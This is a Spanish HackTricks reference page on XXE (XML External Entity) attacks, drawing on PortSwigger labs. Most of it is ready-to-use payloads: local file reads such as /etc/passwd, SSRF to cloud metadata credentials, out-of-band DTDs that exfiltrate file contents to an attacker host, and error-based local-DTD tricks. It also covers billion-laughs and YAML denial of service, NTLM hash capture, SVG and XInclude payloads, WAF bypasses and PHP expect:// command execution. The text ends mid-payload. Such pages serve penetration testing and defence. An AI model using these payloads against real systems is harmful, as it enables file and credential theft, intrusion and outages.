# XXE - XEE - XML External Entity

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén [**artículos oficiales de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Un ataque de Entidad Externa XML (XXE) es un tipo de ataque contra una aplicación que analiza la entrada XML.

## Conceptos básicos de XML

**La mayor parte de esto se basa en esta increíble página de Portswigger:** [**https://portswigger.net/web-security/xxe/xml-entities**](https://portswigger.net/web-security/xxe/xml-entities)

### Visión general del Lenguaje de Marcado Extensible <a href="#overview-of-extensible-markup-language" id="overview-of-extensible-markup-language"></a>

El Lenguaje de Marcado Extensible, comúnmente abreviado como XML, se define como un lenguaje de marcado utilizado para el almacenamiento y transporte de datos. Empleando una estructura reminiscente de un árbol, compuesto por etiquetas y datos similares a HTML, XML se distingue por no restringirse a etiquetas predefinidas. Esta flexibilidad permite la utilización de etiquetas nombradas descriptivamente de acuerdo con los datos que encapsulan. Históricamente, XML ganó prominencia como formato para el transporte de datos, notablemente representado por su contribución al acrónimo "AJAX" (donde "X" significa "XML"). Sin embargo, su popularidad ha disminuido, con JSON emergiendo como el formato preferido.

### Representación de Elementos de Datos en XML a través de Entidades <a href="#representation-of-data-items-in-xml-through-entities" id="representation-of-data-items-in-xml-through-entities"></a>

En XML, las entidades sirven como mecanismos para representar elementos de datos dentro de un documento, ofreciendo una alternativa a la inserción directa de datos. La especificación XML incorpora varias entidades integradas. Por ejemplo, `&lt;` y `&gt;` sirven para representar los caracteres `<` y `>`, respectivamente. Dado su papel en delimitar las etiquetas XML, estos metacaracteres a menudo deben representarse utilizando entidades cuando van a aparecer dentro de los datos.

### Definición de Elementos XML

Las declaraciones de tipo de elemento son críticas en XML, ya que establecen las pautas para la presencia, tipos y secuenciación de elementos dentro de un documento XML. Ejemplos ilustrativos incluyen:

- `<!ELEMENT stockCheck ANY>` indica que el elemento `<stockCheck></stockCheck>` puede contener cualquier tipo de objeto.
- `<!ELEMENT stockCheck EMPTY>` dicta que el elemento `<stockCheck></stockCheck>` debe permanecer sin contenido.
- `<!ELEMENT stockCheck (productId,storeId)>` especifica que el elemento `<stockCheck>` solo puede contener `<productId>` y `<storeId>` como elementos secundarios.

### Introducción a la Definición de Tipo de Documento <a href="#introduction-to-document-type-definition" id="introduction-to-document-type-definition"></a>

La Definición de Tipo de Documento (DTD) desempeña un papel fundamental en XML al proporcionar declaraciones que pueden dictar la estructura de un documento XML, los tipos de datos permitidos y más. El elemento `DOCTYPE`, que es opcional y se coloca al principio de un documento XML, puede declarar una DTD. Las DTD pueden clasificarse como "internas" cuando están completamente integradas en un documento, "externas" cuando se cargan desde una fuente externa, o una combinación de ambas.

### Utilización de Entidades Personalizadas en XML <a href="#utilization-of-custom-entities-in-xml" id="utilization-of-custom-entities-in-xml"></a>

XML facilita la definición de entidades personalizadas dentro de una DTD. Una declaración de ejemplo:

`<!DOCTYPE foo [ <!ENTITY myentity "mi valor de entidad" > ]>`

Tal declaración indica que la referencia de entidad `&myentity;` dentro del documento se sustituirá por "mi valor de entidad".

### Incorporación de Entidades Externas en XML <a href="#incorporation-of-external-entities-in-xml" id="incorporation-of-external-entities-in-xml"></a>

Las entidades externas en XML son un subtipo de entidades personalizadas, caracterizadas por tener sus definiciones externas a la DTD. Estas entidades utilizan la palabra clave `SYSTEM` y requieren una URL que especifique la ubicación desde la cual se recuperará el valor de la entidad, lo que potencialmente permite [ataques de entidad externa XML](https://portswigger.net/web-security/xxe).

### Explotación de Entidades de Parámetro XML para la Detección de XXE

En escenarios donde las entidades estándar son ineficaces para explotar vulnerabilidades de XXE debido a la validación o al endurecimiento del analizador XML, pueden emplearse entidades de parámetro XML. Distinguidas por la inclusión de un carácter de porcentaje precediendo al nombre de la entidad y referenciadas utilizando el mismo carácter, las entidades de parámetro XML se referencian exclusivamente dentro de la DTD. Pueden facilitar la detección ciega de XXE a través de métodos fuera de banda, ejemplificados por la iniciación de una búsqueda DNS y una solicitud HTTP a un dominio controlado por el atacante, confirmando así el éxito de la explotación.


## Principales ataques

**[La mayoría de estos ataques fueron probados utilizando los increíbles laboratorios XEE de Portswiggers: https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)**

### Prueba de Nueva Entidad

En este ataque voy a probar si una simple nueva declaración de ENTIDAD está funcionando
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY toreplace "3"> ]>
<stockCheck>
<productId>&toreplace;</productId>
<storeId>1</storeId>
</stockCheck>
```
![](<../.gitbook/assets/image (220).png>)

### Leer archivo

Intentemos leer `/etc/passwd` de diferentes maneras. Para Windows, podrías intentar leer: `C:\windows\system32\drivers\etc\hosts`

En este primer caso, ten en cuenta que SYSTEM "_\*\*file:///\*\*etc/passwd_" también funcionará.
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>
```
Este segundo caso debería ser útil para extraer un archivo si el servidor web está utilizando PHP (No es el caso de los laboratorios de Portswiggers)
```markup
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
<data>&example;</data>
```
En este tercer caso, notamos que estamos declarando el `Elemento stockCheck` como ANY.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<stockCheck>
<productId>&file;</productId>
<storeId>1</storeId>
</stockCheck3>
```
### Listado de directorios

En las aplicaciones basadas en **Java**, podría ser posible **listar el contenido de un directorio** a través de XXE con una carga útil como (solo pidiendo el directorio en lugar del archivo):
```markup
<!-- Root / -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM "file:///">]><root><foo>&xxe;</foo></root>

<!-- /etc/ -->
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY xxe SYSTEM "file:///etc/" >]><root><foo>&xxe;</foo></root>
```
### SSRF

Un XXE podría ser utilizado para abusar de un SSRF dentro de una nube
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
### SSRF ciego

Utilizando la **técnica comentada anteriormente** puedes hacer que el servidor acceda a un servidor que controlas para mostrar su vulnerabilidad. Pero, si eso no funciona, tal vez sea porque **las entidades XML no están permitidas**, en ese caso podrías intentar usar **entidades de parámetros XML**:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "http://gtd8nhwxylcik0mt2dgvpeapkgq7ew.burpcollaborator.net"> %xxe; ]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
### "Ciego" SSRF - Exfiltrar datos fuera de banda

**En esta ocasión vamos a hacer que el servidor cargue un nuevo DTD con un payload malicioso que enviará el contenido de un archivo a través de una solicitud HTTP (para archivos de varias líneas podrías intentar exfiltrarlo a través de** _**ftp://**_**). Esta explicación se basa en el** [**laboratorio de Portswigger aquí**](https://portswigger.net/web-security/xxe/blind)**.**

En el DTD malicioso proporcionado, se realizan una serie de pasos para exfiltrar datos:

### Ejemplo de DTD Malicioso:
La estructura es la siguiente:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Los pasos ejecutados por esta DTD incluyen:

1. **Definición de Entidades de Parámetros:**
   - Se crea una entidad de parámetro XML, `%file`, que lee el contenido del archivo `/etc/hostname`.
   - Se define otra entidad de parámetro XML, `%eval`. Declara dinámicamente una nueva entidad de parámetro XML, `%exfiltrate`. La entidad `%exfiltrate` se configura para realizar una solicitud HTTP al servidor del atacante, pasando el contenido de la entidad `%file` dentro de la cadena de consulta de la URL.

2. **Ejecución de Entidades:**
   - Se utiliza la entidad `%eval`, lo que conduce a la ejecución de la declaración dinámica de la entidad `%exfiltrate`.
   - Luego se utiliza la entidad `%exfiltrate`, desencadenando una solicitud HTTP a la URL especificada con el contenido del archivo.

El atacante aloja esta DTD maliciosa en un servidor bajo su control, típicamente en una URL como `http://web-attacker.com/malicious.dtd`.

**Carga Útil XXE:**
Para explotar una aplicación vulnerable, el atacante envía una carga útil XXE:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Este payload define una entidad de parámetro XML `%xxe` e la incorpora dentro del DTD. Cuando es procesado por un analizador XML, este payload obtiene el DTD externo desde el servidor del atacante. Luego, el analizador interpreta el DTD en línea, ejecutando los pasos descritos en el DTD malicioso y llevando a la filtración del archivo `/etc/hostname` al servidor del atacante.


### Basado en Errores (DTD Externo)

**En este caso, haremos que el servidor cargue un DTD malicioso que mostrará el contenido de un archivo dentro de un mensaje de error (esto solo es válido si puedes ver mensajes de error).** [**Ejemplo desde aquí.**](https://portswigger.net/web-security/xxe/blind)

Puedes desencadenar un mensaje de error de análisis XML que contenga el contenido del archivo `/etc/passwd` utilizando un DTD externo malicioso de la siguiente manera:
```markup
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
Este DTD lleva a cabo los siguientes pasos:

* Define una entidad de parámetro XML llamada `file`, que contiene el contenido del archivo `/etc/passwd`.
* Define una entidad de parámetro XML llamada `eval`, que contiene una declaración dinámica de otra entidad de parámetro XML llamada `error`. La entidad `error` será evaluada cargando un archivo inexistente cuyo nombre contiene el valor de la entidad `file`.
* Utiliza la entidad `eval`, lo que provoca que se realice la declaración dinámica de la entidad `error`.
* Utiliza la entidad `error`, de modo que su valor se evalúa intentando cargar el archivo inexistente, lo que resulta en un mensaje de error que contiene el nombre del archivo inexistente, que es el contenido del archivo `/etc/passwd`.

Invoca el error de DTD externo con:
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
Y deberías ver el contenido del archivo dentro del mensaje de error de la respuesta del servidor web.

![](<../.gitbook/assets/image (223) (1).png>)

_**Por favor, ten en cuenta que la DTD externa nos permite incluir una entidad dentro de la segunda (****`eval`****), pero está prohibido en la DTD interna. Por lo tanto, no puedes forzar un error sin usar una DTD externa (generalmente).**_

### **Basado en Errores (DTD del sistema)**

Entonces, ¿qué pasa con las vulnerabilidades ciegas de XXE cuando las **interacciones fuera de banda están bloqueadas** (las conexiones externas no están disponibles)?.

Una laguna en la especificación del lenguaje XML puede **exponer datos sensibles a través de mensajes de error cuando la DTD de un documento combina declaraciones internas y externas**. Este problema permite la redefinición interna de entidades declaradas externamente, facilitando la ejecución de ataques de XXE basados en errores. Tales ataques explotan la redefinición de una entidad de parámetro XML, originalmente declarada en una DTD externa, desde dentro de una DTD interna. Cuando las conexiones fuera de banda están bloqueadas por el servidor, los atacantes deben depender de archivos DTD locales para llevar a cabo el ataque, con el objetivo de inducir un error de análisis para revelar información sensible.


Considera un escenario donde el sistema de archivos del servidor contiene un archivo DTD en `/usr/local/app/schema.dtd`, definiendo una entidad llamada `custom_entity`. Un atacante puede inducir un error de análisis XML revelando el contenido del archivo `/etc/passwd` al enviar una DTD híbrida de la siguiente manera:
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
Los pasos delineados son ejecutados por esta DTD:

- La definición de una entidad de parámetro XML llamada `local_dtd` incluye el archivo DTD externo ubicado en el sistema de archivos del servidor.
- Ocurre una redefinición para la entidad de parámetro XML `custom_entity`, originalmente definida en el DTD externo, para encapsular un [exploit XXE basado en errores](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages). Esta redefinición está diseñada para provocar un error de análisis, exponiendo el contenido del archivo `/etc/passwd`.
- Al emplear la entidad `local_dtd`, se activa el DTD externo, abarcando la entidad `custom_entity` recién definida. Esta secuencia de acciones precipita la emisión del mensaje de error apuntado por el exploit.


**Ejemplo del mundo real:** Los sistemas que utilizan el entorno de escritorio GNOME a menudo tienen un DTD en `/usr/share/yelp/dtd/docbookx.dtd` que contiene una entidad llamada `ISOamso`.
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>3;</productId><storeId>1</storeId></stockCheck>
```
![](<../.gitbook/assets/image (224).png>)

Dado que esta técnica utiliza un **DTD interno, primero necesitas encontrar uno válido**. Puedes hacer esto **instalando** el mismo **SO / Software** que está utilizando el servidor y **buscando algunos DTD predeterminados**, o **obteniendo una lista** de **DTD predeterminados** dentro de los sistemas y **verificar** si alguno de ellos existe:
```markup
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
Para obtener más información, consulta [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)

### Encontrar DTDs dentro del sistema

En el siguiente repositorio de GitHub increíble, puedes encontrar **rutas de DTDs que pueden estar presentes en el sistema**:

{% embed url="https://github.com/GoSecure/dtd-finder/tree/master/list" %}

Además, si tienes la **imagen Docker del sistema víctima**, puedes utilizar la herramienta del mismo repositorio para **escanear** la **imagen** y **encontrar** la ruta de los **DTDs** presentes dentro del sistema. Lee el [Readme del repositorio de GitHub](https://github.com/GoSecure/dtd-finder) para aprender cómo hacerlo.
```bash
java -jar dtd-finder-1.2-SNAPSHOT-all.jar /tmp/dadocker.tar

Scanning TAR file /tmp/dadocker.tar

[=] Found a DTD: /tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
Testing 0 entities : []

[=] Found a DTD: /tomcat/lib/servlet-api.jar!/jakarta/servlet/resources/XMLSchema.dtd
Testing 0 entities : []
```
### XXE a través de Analizadores de Office Open XML

Para obtener una explicación más detallada de este ataque, **consulta la segunda sección de [esta increíble publicación](https://labs.detectify.com/2021/09/15/obscure-xxe-attacks/) de Detectify**.

La capacidad de **cargar documentos de Microsoft Office es ofrecida por muchas aplicaciones web**, las cuales proceden a extraer ciertos detalles de estos documentos. Por ejemplo, una aplicación web puede permitir a los usuarios importar datos mediante la carga de una hoja de cálculo en formato XLSX. Para que el analizador extraiga los datos de la hoja de cálculo, inevitablemente necesitará analizar al menos un archivo XML.

Para probar esta vulnerabilidad, es necesario crear un **archivo de Microsoft Office que contenga un payload XXE**. El primer paso es crear un directorio vacío al cual se pueda descomprimir el documento.

Una vez que el documento ha sido descomprimido, el archivo XML ubicado en `./unzipped/word/document.xml` debe ser abierto y editado en un editor de texto preferido (como vim). El XML debe ser modificado para incluir el payload XXE deseado, a menudo comenzando con una solicitud HTTP.

Las líneas XML modificadas deben ser insertadas entre los dos objetos XML raíz. Es importante reemplazar la URL con una URL monitorizable para las solicitudes.

Finalmente, el archivo puede ser comprimido para crear el archivo malicioso poc.docx. Desde el directorio "unzipped" previamente creado, se debe ejecutar el siguiente comando:

Ahora, el archivo creado puede ser cargado en la aplicación web potencialmente vulnerable, y se puede esperar que aparezca una solicitud en los registros de Burp Collaborator.


### Protocolo Jar

El protocolo `jar` solo está disponible en **aplicaciones Java**. Permite acceder a archivos dentro de un archivo **PKZIP** (`.zip`, `.jar`, ...) y funciona para archivos locales y remotos:
```
jar:file:///var/myarchive.zip!/file.txt
jar:https://download.host.com/myarchive.zip!/file.txt
```
{% hint style="danger" %}
Para poder acceder a archivos dentro de archivos PKZIP es **súper útil para abusar de XXE a través de archivos DTD del sistema.** Consulta [esta sección para aprender cómo abusar de archivos DTD del sistema](xxe-xee-xml-external-entity.md#error-based-system-dtd).
{% endhint %}

#### Detrás de escena

1. Realiza una solicitud HTTP para cargar el archivo zip. `https://download.host.com/myarchive.zip`
2. Guarda la respuesta HTTP en una ubicación temporal. `/tmp/...`
3. Extrae el archivo.
4. Lee el `file.zip`
5. Elimina los archivos temporales.

Ten en cuenta que es posible detener el flujo en el segundo paso. El truco es nunca cerrar la conexión al servir el archivo. [Estas herramientas pueden ser útiles](https://github.com/GoSecure/xxe-workshop/tree/master/24\_write\_xxe/solution): una en python `slow_http_server.py` y otra en java `slowserver.jar`.

Una vez que el servidor haya descargado tu archivo, necesitas encontrar su ubicación navegando por el directorio temporal. Al ser aleatoria, la ruta del archivo no se puede predecir de antemano.

![Jar](https://gosecure.github.io/xxe-workshop/img/74fac3155d455980.png)

{% hint style="danger" %}
Escribir archivos en un directorio temporal puede ayudar a **escalar otra vulnerabilidad que involucre una travesía de directorio** (como inclusión de archivos locales, inyección de plantillas, RCE de XSLT, deserialización, etc).
{% endhint %}

### XSS
```markup
<![CDATA[<]]>script<![CDATA[>]]>alert(1)<![CDATA[<]]>/script<![CDATA[>]]>
```
### DoS

#### Ataque de Mil Millones de Risas
```markup
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```
#### Ataque Yaml
```markup
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]
h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]
i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]
```
#### Ataque de Explosión Cuadrática

![](<../.gitbook/assets/image (531).png>)

#### Obteniendo NTML

En hosts de Windows es posible obtener el hash NTML del usuario del servidor web configurando un controlador responder.py:
```
Responder.py -I eth0 -v
```
y enviando la siguiente solicitud
```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM 'file://///attackerIp//randomDir/random.jpg'> ]>
<data>&example;</data>
```
## Superficies XXE Ocultas

### XInclude

En algunos escenarios, **los datos enviados por el cliente se incorporan en un documento XML mediante procesos en el lado del servidor antes de su análisis**. Esto suele ocurrir cuando los datos del cliente se integran en una **solicitud SOAP de backend**, que posteriormente es manejada por un servicio SOAP en el backend.

Realizar un ataque XXE tradicional resulta desafiante en estos casos debido al control limitado sobre la totalidad del documento XML, específicamente la incapacidad de modificar o introducir un elemento `DOCTYPE`. Sin embargo, aprovechar `XInclude`, una característica del estándar XML que permite ensamblar un documento XML a partir de subdocumentos más pequeños, presenta una solución alternativa. Este enfoque permite un ataque `XInclude` dentro de cualquier elemento de datos de un documento XML, haciéndolo factible en casos donde el control se restringe a una pieza individual de datos incrustada en un documento XML generado por el servidor.

Para iniciar un ataque `XInclude`, se requiere la inclusión del espacio de nombres `XInclude`, junto con la especificación de la ruta de archivo destinada para la inclusión. El siguiente ejemplo muestra cómo podría estructurarse dicho ataque:
```xml
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1
```
Consulta [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) para más información!

### SVG - Carga de Archivos

Los archivos subidos por usuarios a ciertas aplicaciones, que luego son procesados en el servidor, pueden explotar vulnerabilidades en cómo se manejan los archivos XML o los formatos de archivos que contienen XML. Formatos comunes de archivos como documentos de oficina (DOCX) e imágenes (SVG) están basados en XML.

Cuando los usuarios **suben imágenes**, estas imágenes son procesadas o validadas en el servidor. Incluso para aplicaciones que esperan formatos como PNG o JPEG, **la biblioteca de procesamiento de imágenes del servidor también podría admitir imágenes SVG**. SVG, al ser un formato basado en XML, puede ser explotado por atacantes para enviar imágenes SVG maliciosas, exponiendo así al servidor a vulnerabilidades de XXE (Entidad Externa XML).

A continuación se muestra un ejemplo de tal exploit, donde una imagen SVG maliciosa intenta leer archivos del sistema:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200"><image xlink:href="file:///etc/hostname"></image></svg>
```
Otro método implica intentar **ejecutar comandos** a través del envoltorio "expect" de PHP:
```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<image xlink:href="expect://ls"></image>
</svg>
```
En ambos casos, se utiliza el formato SVG para lanzar ataques que explotan las capacidades de procesamiento XML del software del servidor, resaltando la necesidad de una sólida validación de entrada y medidas de seguridad.

¡Consulta [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe) para obtener más información!

**Ten en cuenta que la primera línea del archivo leído o del resultado de la ejecución aparecerá DENTRO de la imagen creada. Por lo tanto, debes poder acceder a la imagen que SVG ha creado.**

### **PDF - Subida de archivos**

Lee el siguiente post para **aprender cómo explotar un XXE subiendo un archivo PDF**:

{% content-ref url="file-upload/pdf-upload-xxe-and-cors-bypass.md" %}
[pdf-upload-xxe-and-cors-bypass.md](file-upload/pdf-upload-xxe-and-cors-bypass.md)
{% endcontent-ref %}

### Content-Type: De x-www-urlencoded a XML

Si una solicitud POST acepta los datos en formato XML, podrías intentar explotar un XXE en esa solicitud. Por ejemplo, si una solicitud normal contiene lo siguiente:
```markup
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Entonces podrías enviar la siguiente solicitud, con el mismo resultado:
```markup
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: De JSON a XEE

Para cambiar la solicitud, podrías usar una Extensión de Burp llamada "**Content Type Converter**". [Aquí](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) puedes encontrar este ejemplo:
```markup
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```markup
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
Otro ejemplo se puede encontrar [aquí](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## Bypass de WAF y Protecciones

### Base64
```markup
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
Esto solo funciona si el servidor XML acepta el protocolo `data://`.

### UTF-7

Puedes usar la \[**"Receta de codificación**" de CyberChef aquí ]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)aquí]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29aquí)) para transformar a UTF-7.
```markup
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```markup
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### Bypass de Protocolo de Archivo

Si la web está utilizando PHP, en lugar de usar `file:/` puedes usar **envolturas de PHP** `php://filter/convert.base64-encode/resource=` para **acceder a archivos internos**.

Si la web está utilizando Java, puedes verificar el [**protocolo jar**](xxe-xee-xml-external-entity.md#jar-protocol).

### Entidades HTML

Truco de [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
Puedes crear una **entidad dentro de una entidad** codificándola con **entidades HTML** y luego llamarla para **cargar un dtd**.\
Ten en cuenta que las **Entidades HTML** utilizadas deben ser **numéricas** (como \[en este ejemplo]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```markup
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
Ejemplo DTD:
```markup
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## Envolturas PHP

### Base64

**Extraer** _**index.php**_
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Extraer recurso externo**
```markup
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Ejecución de código remoto

**Si el módulo "expect" de PHP está cargado**
```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
